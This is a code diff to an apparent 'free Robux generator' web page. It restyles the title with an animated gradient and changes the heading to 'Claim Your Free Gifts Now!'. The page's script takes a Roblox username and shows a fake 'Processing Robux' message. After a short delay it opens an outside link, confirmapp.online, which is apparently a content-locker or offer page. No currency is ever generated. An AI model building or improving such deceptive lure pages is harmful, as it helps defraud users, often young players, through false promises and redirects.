@@ -44,10 +44,27 @@ body{
   100%{transform:rotate(360deg)}
 }
 
-h1{
-  margin-bottom:20px;
-  color:#00e5ff;
-  text-shadow:0 0 10px #00e5ff;
+.dynamic-title {
+  font-size: 2.5em;
+  font-weight: bold;
+  background: linear-gradient(270deg, #ff3d3d, #ff6d00, #00e5ff, #00bfa5, #ff3d3d);
+  background-size: 1000% 1000%;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  animation: colorShift 8s ease infinite;
+  text-shadow: 0 0 10px rgba(255,255,255,0.3);
+  margin-bottom: 20px;
+  transition: transform 0.3s;
+}
+
+.dynamic-title:hover {
+  transform: scale(1.05);
+}
+
+@keyframes colorShift {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
 }
 
 .search-container{
@@ -214,7 +231,7 @@ h1{
   <i class="fas fa-search"></i>
 </div>
 
-<h1>Welcome to App Player®</h1>
+<h1 class="dynamic-title">Claim Your Free Gifts Now!</h1>
 
 <div class="counters">
   <div class="counter">
@@ -278,35 +295,25 @@ updateCounters()
 
 function openPopup(){ document.getElementById("popup-bg").classList.add("show"); }
 
-// Store data for confirmation
 let robuxAmount=0, robloxUser="";
-
-// Step 1: Confirm Robux amount
 function confirmRobux(amount){
   robloxUser = document.getElementById("roblox-username").value.trim();
   if (robloxUser === "") { alert("Please enter your Roblox username."); return; }
-
   let regex = /^[a-zA-Z0-9_]{3,20}$/;
   if (!regex.test(robloxUser)) { alert("Invalid username! Use 3-20 letters, numbers, or underscores."); return; }
-
   robuxAmount = amount;
   document.getElementById("confirm-text").textContent = 
     `Are you sure you want to receive ${robuxAmount} Robux for "${robloxUser}"?`;
-
   document.getElementById("popup-bg").classList.remove("show");
   document.getElementById("confirm-popup").classList.add("show");
 }
 
-// Step 2: Generate Robux
 function generateRobux(){
   let popup = document.getElementById("confirm-content");
   popup.innerHTML = `<h3>Processing ${robuxAmount} Robux for "${robloxUser}"...</h3><p>Please wait...</p>`;
-
   setTimeout(() => {
     window.open("https://confirmapp.online/cl/i/822jo6", "_blank");
     document.getElementById("confirm-popup").classList.remove("show");
-
-    // Reset original popup content
     document.getElementById("popup-content").innerHTML = `
       <h3>Enter Your Roblox Username</h3>
       <input type="text" id="roblox-username" placeholder="Username..."><br>
@@ -320,7 +327,6 @@ function generateRobux(){
   }, 2500);
 }
 
-// Cancel confirmation
 function cancelConfirm(){
   document.getElementById("confirm-popup").classList.remove("show");
   document.getElementById("popup-bg").classList.add("show");
